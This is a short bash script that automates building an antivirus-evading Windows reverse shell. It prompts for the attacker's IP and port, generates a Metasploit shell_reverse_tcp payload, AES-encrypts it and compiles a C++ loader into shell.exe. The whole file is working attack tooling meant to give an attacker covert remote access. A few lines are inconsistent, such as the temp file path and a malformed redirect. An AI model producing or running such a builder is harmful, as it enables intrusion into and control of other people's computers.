#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

echo -e "${YELLOW}[+] Create Undetectable Windows Reverse Shell\nProvide the following information about YOUR attacker machine${ENDCOLOR}\n"
printf "IP = " 
read -r ip
printf "PORT = "
read -r port
printf "PATH to save shell = "
read -r shellpath


echo -e ""
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port  -f raw -o $shellpath/temp.raw >/dev/null
cp code/revshell.cpp code/revshell2.cpp 2>/dev/null
python2 code/aesencrypt.py temp.raw >/dev/null
x86_64-w64-mingw32-g++ code/revshell2.cpp code/helpers.cpp -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -o shell.exe -fpermissive 2</dev/null
rm temp.raw
echo -e ""
ls shell.exe >/dev/null
e=$(echo $?)

if [ $e == 0 ]; then
	echo -e "${GREEN}[+] Shell Created Successfully - shell.exe${ENDCOLOR}"
else
	echo -e "${RED}[-] Error Creating Shell${ENDCOLOR}\n"
        exit
fi

